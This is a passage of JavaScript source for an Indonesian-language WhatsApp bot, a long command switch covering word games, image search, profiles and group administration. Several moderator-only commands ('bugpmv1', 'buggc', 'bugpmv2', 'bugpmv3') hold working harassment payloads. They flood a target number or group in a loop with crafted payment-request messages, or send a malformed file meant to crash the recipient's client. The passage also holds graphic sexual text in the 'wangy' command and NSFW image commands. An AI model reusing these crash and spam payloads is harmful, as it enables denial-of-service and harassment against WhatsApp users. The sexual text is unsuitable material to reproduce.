 âž² *Message : ${q ? q : 'empty'}*\n\n`
for (let mem of participants) {
teks += `â­” @${mem.id.split('@')[0]}\n`
}
Miku.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
}
break


case 'bugpmv1': {
if (!isMod) return reply (mess.mod)
if (args.length < 1) return m.reply(`Contoh : ${prefix + command} Nomer target/total pesan/durasi\n\nContoh : ${prefix + command} 628910111213/10/10s\n\nS = Detik`)
num = q.split('/')[0]
jumlah = q.split('/')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Okay sir!`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Rimed/xpic.jpeg') }, { upload: Miku.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": wm,
}
}}), { userJid: m.chat, quoted: doc})
Miku.relayMessage(`${num}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Sukses Mengirim Bug Ke nomer : ${num}\nTotal Spam: ${jumlah}`)
}
break


case 'buggc': {
if (!isMod) return
if (args.length < 1) return m.reply(`Contoh : ${prefix + command} IDGroup/total pesan/durasi\n\nContoh : ${prefix + command} 120363027389430493/10/10s\n\nS = Detik\n\nPastikan Bot Sudah join kedalam group tersebut!`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Okay sir`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Rimed/xpic.jpeg') }, { upload: Miku.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER HW MODS WA`,
}
}}), { userJid: m.chat, quoted: doc})
Miku.relayMessage(`${num}@g.us`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
case 'bugpmv2': {
if (!isMod) return reply (mess.mod)
if (!args[0]) return reply (`Contoh : ${prefix + command} 6289997463736`)
lodaChoos = fs.readFileSync('./Rimed/randiKaBaccha.sound')
Miku.sendMessage(`${args[0]}@s.whatsapp.net`, {document: lodaChoos, mimetype: 'application/octet-stream', fileName:`${BotName} ${xeonbut2}.sound` }, {quoted:doc})
}
break
case 'bugpmv3': {
if (!isMod) return reply (mess.mod)
if (!agrs[0]) return reply (`Contoh : ${prefix + command} 6289997463736`)
 lodaChoos2 = fs.readFileSync('./Rimed/randiKaBaccha.sound')
 Miku.sendMessage(m.chat, {document: lodaChoos2, mimetype: '', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
 }
 break



//
case 'ass': case 'bdsm': case 'cum':
case 'maid': case 'panties': case 'orgy':
case 'cuckold': case 'netorare': case 'blowjob':
case 'feet': case 'pussy': case 'gangbang':
case 'cumslut': case 'thighs': case 'masturbation':
case 'school': case 'yuri':{
if (!m.isGroup) return reply (`Perintah tersebut hanya bisa digunakan didalam group`)
if (!AntiNsfw) return reply (`Ange Bang? Aktifin mode *Hentai* Dulu atuh euy`)
if (isBan) return reply (mess.banned)
if (isBanChat) return reply (mess.bangc)
reply (`Saya tau anda ange , tapi bisa dong tunggu bentar 😏`)
nye = `https://megayaa.herokuapp.com/api/akaneko/${command}`
let asukowe = [{buttonId: `-donasi`, buttonText:{displayText:`Bantu Owner Tetap Hidup!`},type:1}]
let buttonasu ={
image : {url:nye},
caption : `Silahkeun Dinickmati!`,
buttons : asukowe,
headerType : 1
}
await Miku.sendMessage(m.chat, buttonasu, {quoted : m}).catch(err=>{return(`Engror banh`)
})
}
break


/*case 'tebak': {
                if (!text) return replay(`Example : ${prefix + command} song\n\nOption : \n1. music\n2. picture (indo)\n3. word\n4. sentence\n5. lyrics (indo)\n6. blank (indo)`)
                if (args[0] === "song") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return replay(`There Are Still Unfinished Sessions`)
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await Miku.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    Miku.sendText(m.chat, `What Is The Name Of This Song?\n\nArtist : ${result.artist}\nTime : 60 seconds`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Miku.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `Time Has Run Out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant To Play? Press The Button Below`, Miku.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'picture') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return replay(`There Are Still Unfinished Sessions!`)
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Miku.sendImage(m.chat, result.img, `Please Answer The Questions Above\n\nDescription : ${result.deskripsi}\nTime : 60 seconds`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Miku.sendButtonText(m.chat, [{ buttonId: 'guess picture', buttonText: { displayText: 'Guess The Picture' }, type: 1 }], `Time Has Run Out\nAnswer:  ${tebakgambar[m.sender.split('@')[0]]}\n\nWant To Play Again? PressThe Button Below`, Miku.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    } }
                     else if (args[0] === 'word') {
                    
                } else if (args[0] === 'sentence') {
                     else if (args[0] === 'lyrics') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return replay(`There Are Still Unfinished Sessions!`)
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                   Miku.sendText(m.chat, `These Are The Lyrics Of Which Song? : *${result.soal}*?\nTime : 60 seconds`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Miku.sendButtonText(m.chat, [{ buttonId: 'guess lyrics', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `Time Out\nAnswer:  ${tebaklirik[m.sender.split('@')[0]]}\nWant To Play Again? PressThe Button Below`, Miku.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'blank') {
                    */
case 'tebakkalimat':{
if (isBan) return reply (mess.ban)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return replay(`There Are Still Unfinished Sessions!`)
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Miku.sendText(m.chat, `Sikahkeun jawab soal dibawah ini!!\n-----------\n${result.soal}\n-----------\nWaktu menjawab 60detik dimulai dari sekarang!!\n\nJawwbnya pake huruf kecil semua yah!`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
Miku.sendMessage(m.chat, {text : `Waktu menjawab telah habis\n\nJawbannya adalah : ${tebakkalimat[m.sender.split('@')[0]]}`},{quoted : m})
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                }
break
case 'tebakkata':{
if (isBan) return reply (`Turu`)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return replay(`Kelarin dulu permainan sebelumnya kak!`)
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
Miku.sendText(m.chat, `Soal : ${result.soal}\n\nWaktu 60detik Dimulai dari sekarang!\n\nJawabnya pake huruf kecil semua yaa!`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Miku.sendMessage(m.chat, {image : {url :'https://telegra.ph/file/784d202c3a634bc7140c9.jpg' }, caption : `Waktu Habis!!!\n\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}`}, {quoted : m})
                    delete tebakkata[m.sender.split('@')[0]]
                    }
}
		
break		


		
case 'tebakgambar':{
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return replay(`Kelarin dulu permainan sebelumnya kak!`)
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
Miku.sendImage(m.chat, result.img, `Clue : ${result.deskripsi}\n\nWaktu Menjawab 60detik, Cukuplah yak.\n Lu coli dengan waktu kurang dari 60detik aja cukup, masa maen ginian gacukup 🤭\nJawab pake huruf kecil semua yah`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
Miku.sendMessage(m.chat, {image : {url : 'https://telegra.ph/file/827fbd7afbcf586dacbce.jpg'}, caption : `Waktu Telah Habis!\n\nJawbannya : ${tebakgambar[m.sender.split('@')[0]]}`},{quoted : m})
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
        
}
break

case 'caklontong':{
if (isBan) return reply (mess.ban)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return replay(`Kelarin dulu permainan sebelumnya kak!`)
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                   Miku.sendText(m.chat, `*Jawablah Pertanyaan dibawah ini!*\n\n*${result.soal}*\nWaktu menjawab 60detik Dimulai dari sekarang!!!\njawabnya pake huruf kecil semua yah!`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Miku.sendMessage(m.chat, {image : {url :'https://telegra.ph/file/827fbd7afbcf586dacbce.jpg' }, caption : `Waktu Habis!!!\n\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nPenjelasan : ${caklontong_desk[m.sender.split('@')[0]]}\n\nJangan Ngamuk Ke bot kak ,ngamuknya ke cak lontong sono:v`}, {quoted : m})
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            
            
            break		
		
		
case 'pornhub2':
   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.waiting)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => Miku.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${BotName}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'pornhub':{
	if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
if(!q) return reply(`Example: ${prefix + command} Miuna|Bot`)
reply(mess.waiting)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anu = await textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
console.log(anu)
Miku.sendMessage(from,{image:{url:anu}, caption:"Nihh Bang"},{quoted:m})
}
break		
		
case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) return replay(`Selesaikan Suitmu Terlebih Dahulu!`)
	    if (m.mentionedJid[0] === m.sender) return reply(`Can't Play With Myself !`)
            if (!m.mentionedJid[0]) return reply(`_Kamu Mau Bertanding?_\nTag Orang yang mau dilawan..\n\nContoh : ${prefix}suit @mamatasu`)
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0])))  reply(`Orang Yang Kamu tantang sedang bermain bersama orang lain! :(`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_
@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} Untuk Melakukan Suit
Tolong @${m.mentionedJid[0].split`@`[0]} Ketik *Setuju* Untuk menerima tantangan dan ketik *Males* untuk menolak`
            this.suit[id] = {
            chat: await Miku.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) Miku.sendText(m.chat, `_Waktu Suit Telah Habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break		
		
	 case 'artimimpi': case 'tafsirmimpi': {
                if (!text) return reply(`Example : ${prefix + command} belanja`)
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return reply(anu.message)
                Miku.sendText(m.chat, `🐶 *Dream :* ${anu.message.mimpi}\n🐶 *Meaning :* ${anu.message.arti}\n🐶 *Solution :* ${anu.message.solusi}`, m)
            }
            break			
case 'addmsg': {
                if (!m.quoted) return reply(`Reply Message You Want To Save In Database`)
                if (!text) return reply(`Example : ${prefix + command} File Name`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return reply(`'${text}' Has Been Registered In The Message List`)
                msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Successfully Added Message In Message List As '${text}'
    
Access With ${prefix}getmsg ${text}
View List Of Messages With ${prefix}listmsg`)
            }
            break		
	case 'getmsg': {
                if (!text) return reply(`Example : ${prefix + command} file name\n\nView Message List With ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return reply(`'${text}' Not Listed In The Message List`)
                Miku.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 DATABASE LIST 」\n\n'
		for (let i of seplit) {
		    teks += `🐕 *Name :* ${i.nama}\n🐕 *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return reply(`'${text}' Not Listed In The Message List`)
		delete msgs[text.toLowerCase()]
		reply(`Delete Successfully '${text}' From The Message list`)
            }
	    break	
		
		
            case 'setnamabot': case 'setnamebot': {
	    if (!isCreator) return replay(mess.botowner)
            if (!text) return m.reply(`Contoh: ${prefix + command} WhatsApp ✅`)
            let name = await Miku.updateProfileName(text)
            m.reply(`_Nama bot berhasil diubah_`)
            }
            break
 case 'setpp': {
                if (!isCreator) throw mess.owner
                if (!/image/.test(mime)) return replay( `Kirim/Reply Image Dengan Caption ${prefix + command}` )
                if (/webp/.test(mime)) return replay( `Kirim/Reply Image Dengan Caption ${prefix + command}` )
                let media = await Miku.downloadAndSaveMediaMessage(quoted)
                await Miku.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.jobdone)
                }
                break
	
	

case 'lewd' :
reply (mess.lewd)
break

	
	
	case 'request': case 'req' :{
if (m.isGroup)	return reply (`Fitur Ini hanya berlaku dichat pribadi/Private Message`)		
if (!text) return m.reply(`Tolong Tulis Nama Lengkap Karakter Berserta Asal Usulnya! \n\nContoh Request Karakter Dari Game : ${prefix + command} karakter Sangonomiya Kokomi Dari Game Genshit Impact\n\nContoh Request karakter dari anime : ${prefix + command} Fujiwara Chika Dari Anime Kaguya-Sama Love Is War\n\nContoh Request Artist : ${prefix + command} https://soraneko.fanbox.cc/ \n\nJika Hanya menulis nama lengkap karakter saja(tidak dengan asal usulnya), maka request'anmu tidak akan direspon!!!\n\nHarap Join GC dibawah ini agar nnti jika request'anmu dipost akan diTag\nhttps://chat.whatsapp.com/CLwGABzGLrn13nOmpZKysc\nGajoin? ya gadikabulin :v`)
				Miku.sendMessage(`120363027296875929@g.us`, {text: `*Hallo Babutachi! , ada yang request karakter nih*\n\n*Pesan : ${text}*\n*Orangnya : ${m.sender}*`,}, {quoted: {key: { fromMe: false,
				participant: `${m.sender}`, ...(from ? { remoteJid: "120363027296875929@g.us" } : {})},
			message: { "extendedTextMessage": {
				"text": `Ada yg request oniichan!`,
				"title": `Pasang iklan murah bang`,
				}}}})
				m.reply(' *Permintaan terkirim*\nPerlu Diingat, Satu orang hanya bisa merequest 1x. jika ingin merequest lagi maka tunggu 3hari kemudian! \n\n_Harap Join GC dibawah ini agar nnti jika requestmu dipost akan diTag_\nhttps://chat.whatsapp.com/CLwGABzGLrn13nOmpZKysc')
				}
			break	
	
		
    case 'wangy':
    if (isBan) return reply(mess.ban)	 			
    if (isBanChat) return reply(mess.banChat)
                 if (!text) return replay(`Gunakan nama karakternya! \nContoh : *${prefix + command} Keqing*`)           
qq = q.toUpperCase()
                 awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, AHHHHHH BAUNYA ${qq} WANGY SEKALIIII COYYY,  AKU MAU NYIUMIN AROMA WANGY NYAAA. ${qq} AAAAAAAAH ~ RAMBUTNYA.... AHHH RAMBUTNYA JUGA PENGEN AKU ELUS ELUS SAMBIL AKU ENTOT BRUTAL ~ AAAAAH MEMEK ${qq} PASTI SANGAT PINK DAN TENTU SAYA *WANGY* BANGET ❤️ ❤️ ❤️ AAAAAAAH ${qq} AAAAAA CANTIK BANGET ANJENG!............ ${qq} AAAAAAAAAAAAAAAAAAAAGH GATAHAN PENGEN CROTTTTT!! ❤️ ❤️ ❤️Apaan ?  ? ${qq} Engga nyata ? Lu Iri ? BILANG BOSS, SERLOK BRO! ? APA APA APA ? STRESS ? AKU GAPEDULI ANJENG!. ❤️ ❤️ ❤️ ${qq}KU ... ${qq} Selalu memperhatikanku ketika aku coli pake gambarnya. Apa ${qq} ?, Kamu mau ngentot sama aku ?  aaaaaaaaaaah GASKEN ATUH! . ${qq} Mau berapa ronde ? Sampe pagi pun aku gas. ${qq} AHHHH , SLURRPP SLURRPP. Syuurrrr. Kamu Mau Crott ${qq}?. tahan sebentar aku juga mau Croott.  ❤️ ❤️ ❤️  ${qq} AKU AKAN CROOTT SEBANYAK 1TON BIAR BISA MENGISI PENUH RAHIMMU. CROTTTT 💦💦💦💦💦💦 AHHH~`
              await sleep(30000)
                    reply(awikwok)
                
                 break


case 'me': case 'profile': 
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
  if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
  if (!isInventory){ addInventori(m.sender) }
  if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
     

     var flob = await getBuffer(picak+'User Profile')
     var bio= await Miku.fetchStatus(m.sender)
     var bioo = bio.status
     const adn= isAdmins? "True":"False"
     
     try {
        
        pfp=await Miku.profilePictureUrl(m.sender, 'image')
    
          } catch (e) {
     
      pfp ='https://wallpapercave.com/wp/wp10524580.jpg'
    }

     const profilexx = `*「  Profile Info  」*\n\n*User Name* : _${pushname}_\n*Bio* : _${bioo}_\n*Group Admin Status* : ${adn}\n*Level* : ${levelMenu}\n*Exp* : ${xpMenu} out of ${reqXp}\n*Title* : ${role}`
 


let buttonspros = [
    {buttonId: `-donasi`, buttonText: {displayText: 'Sedekah dapet role :v'}, type: 1}
    ]
            let buttonMessage = {
                image: { url: pfp },
                caption: profilexx,
                footer: `${BotName}`,
                buttons: buttonspros,
                headerType: 4
            }
        Miku.sendMessage(m.chat,buttonMessage,{quoted:m})
        	
            break
		
	
		
		
		
		
		
		
      case 'antilink':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
        reply(` *━━━〈   Antilink   〉━━━*\n\n-antilinkgc (Grup Chat)\n\n-antilinkytch (Youtube Channel)\n\n-antilinkfb (Facebook)\n\n-antiwame (wa.me/xxxx)\n\n-antilinktg (Telegram)\n\n-antilinkytvid (Youtube Video)\n\n-antilinktwit (Twitter)\n\n-antilinktt (Tiktod)\n\n-antilinkig (Instagram)\n\n-antilinkall (Semua Link)`)
    break
		
case 'banchat': case 'bangroup':{
if (isBan) return reply(mess.banned)	 			
if (!isCreator) return replay(mess.botowner)
if (args[0] === "on") {
if (isBanChat) return replay('This Group is Already Banned from using me!')
banchat.push(from)
replay('This Group has been banned from using me!')
var groupe = await Miku.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Miku.sendMessage(from, {text: `\`\`\`「 Notice 」\`\`\`\n\nThis group is banned from using bot. So, here nobody can use me anymore!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!isBanChat) return replay('This Group is Already Banned from using me!')
let off = banchat.indexOf(from)
banchat.splice(off, 1)
replay('This Group has been *unbanned* from using me!')
} else {
  let buttonsntnsfw = [
  { buttonId: `-bangroup on`, buttonText: { displayText: 'Ban' }, type: 1 },
  { buttonId: `-bangroup off`, buttonText: { displayText: 'Unban' }, type: 1 }
  ]
  await Miku.sendButtonText(m.chat, buttonsntnsfw, `Please choose any Button below.\n\n *On / Off*`, `${global.BotName }`, m)
  }
  }
  break

 

	case 'asupan':
		if (args.length == 0) return reply(`Contoh: ${prefix + command} azur_lane\nContoh: ${prefix + command} Albedo_(overlord)`)
         if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
   		 if (isBanChat) return reply(mess.bangc)
		harusdiisi = args.join(" ")
		reply(mess.waiting)
		
nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=${harusdiisi}`
Miku.sendMessage(from, {image:{url:nye}, caption:"Ini kak!"}, {quoted:m})
break	
		case 'update':{
		if (args.length == 0) return reply(`Contoh: ${prefix + command} azur_lane\nContoh: ${prefix + command} Albedo_(overlord)`)
         if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
   		 if (isBanChat) return reply(mess.bangc)
		harusdiisi = args.join(" ")
		reply(mess.waiting)
		
nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=${harusdiisi}`
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
await sleep(5000)
Miku.sendMessage(from, {image:{url:nye}})
}
break	
		


case 'groupbot':
case 'botgrups':
case 'botgroups':
case 'botgrup':
case 'botgroup':
if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
reply(` Jangan lupa join yak!
*GROUP 1*
https://chat.whatsapp.com/CLwGABzGLrn13nOmpZKysc *BPM Update*
*GROUP 2*
https://chat.whatsapp.com/FlY1IkMODONLRQa7FmpXFkl *Diskusi Apa Sadja*`)
break	
		
case 'reaksi': case 'react': case 'reactions': case 'r':
        if (isBan) return reply(mess.banned)	 			
        if (isBanChat) return reply(mess.bangc)
            reply(` *━━━〈  📍 Reaksi 📍  〉━━━*\n\n-Bonk    -Cry     -Bully\n-Cuddle    -Hug    -Kiss\n-Lick    -Pat    -Smug\n-Yeet    -Blush    -Smile\n-Wave    -Highfive    -Handhold\n-Nom    -Glomp    -Bite\n-Slap    -Kill    -Happy\n-Wink    -Poke    -Dance\n       -Cringe\n\n*━━━〈  📍 Reaksi 📍  〉━━━* `)
        break   
    


    



case 'ringtone': {
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
            if (!args.join(" ")) return reply(`Example: ${prefix}ringtone black over`)
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		Miku.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break


case 'film': case 'movie': case 'moviesearch':
if (isBan) return reply(mess.banned)
	if (isBanChat) return reply(mess.bangc)
	reply(mess.waiting)
if (!q) return reply(`Tolong masukkan judulnya...\nContoh: ${prefix}movie Spiderman`)
xfarrapi.Film(q)
    .then(data => {console.log(data)
    let krl = `*Search Term:* ${q}\n\n`
			    for (let i of data) {
                krl += (`-----------------------------------------------------------------------------\n\n\n*Movie Name:* ${i.judul}\n *Quality :* ${i.quality}\n *Type : ${i.type}*\n *Uploaded on :* ${i.upload}\n *Source URL :* ${i.link}\n\n\n`)
                }
               Miku.sendMessage(from, { image: { url: data[0].thumb}, caption: krl }, { quoted: fdocs })
});
break

case 'lirik':{
if (!args.join(" ")) return reply ('Emm, Judulnya?')
reply (mess.waiting)
ri = await fetchJson(`https://megayaa.herokuapp.com/api/liriklagu?lagu=${args.join(" ")}`)
judul = ri.result.judul
penyan = ri.result.penyanyi
const thumb = ri.result.thumb
lirik = ri.result.lirik
let buttonn =[ 
{buttonId : `-donasi`, buttonText : {displayText :`Sedekah onlen!`},type:1}
]
let buttonMessage = {
image : {url : thumb},
caption : `Judul : ${judul}\nPenyanyi : ${penyan}\n\nLirik : ${lirik}`,
footer : "Miuna",
buttons : buttonn,
headerType : 4
}
Miku.sendMessage(m.chat, buttonMessage).catch((err) => {
                     reply(`Lirik tidak ditemukan atau Webnya engror!`)
                 })
}
break
case 'wallpaper': case 'animewallpaper': case 'animewall': {
if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!args.join(" ")) return reply("Please enter a term to search!")
const { AnimeWallpaper } =require("anime-wallpaper")
const wall = new AnimeWallpaper();
const pages = [1,2,3,4];
const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall .getAnimeWall4({ title: q, type: "sfw", page: pages }).catch(() => null);
        const i = Math.floor(Math.random() * wallpaper.length);
		
let buttons = [
            {buttonId: `-donasi}`, buttonText: {displayText: 'Sedekah Kak!'}, type: 1}
        ]
        let buttonMessage = {
            image: {url:wallpaper[i].image},
            caption: `*Search term:* ${q}`,
            footer: `${BotName}`,
            buttons: buttons,
            headerType: 4
        }
        Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
    break


case 'wikimedia': case 'wikiimage': {
	if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
                if (!args.join(" ")) return reply("What picture are you looking for??")
		let { wikimedia } = require('./lib/scraper')
        anu = await wikimedia(args)
        hasil = anu[Math.floor(Math.random() * anu.length)]
        let buttons = [
            {buttonId: `-wikimedia ${args.join(" ")}`, buttonText: {displayText: 'Next Image'}, type: 1}
        ]
        let buttonMessage = {
            image: { url: hasil.image },
            caption: `Title : ${hasil.title}\nSource : ${hasil.source}\nMedia Url : ${hasil.image}`,
            footer: `${BotName}`,
            buttons: buttons,
            headerType: 4
        }
        Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
    break


case 'quotesanime': case 'quoteanime': case 'animequote': case 'animequotes':{
		let { quotesAnime } = require('./lib/scraper')
        let anu = await quotesAnime()
        hasil = anu[Math.floor(Math.random() * anu.length)]
        let buttons = [
            {buttonId: `-quotesanime`, buttonText: {displayText: '>>'}, type: 1}
        ]
        let buttonMessage = {
            text: `_${hasil.quotes}_\n\nBy '${hasil.karakter}', ${hasil.anime}\n\n- ${hasil.up_at}`,
            footer: 'Miuna',
            buttons: buttons,
            headerType: 2
        }
        Miku.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
    break


case 'animestory': { 
	if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
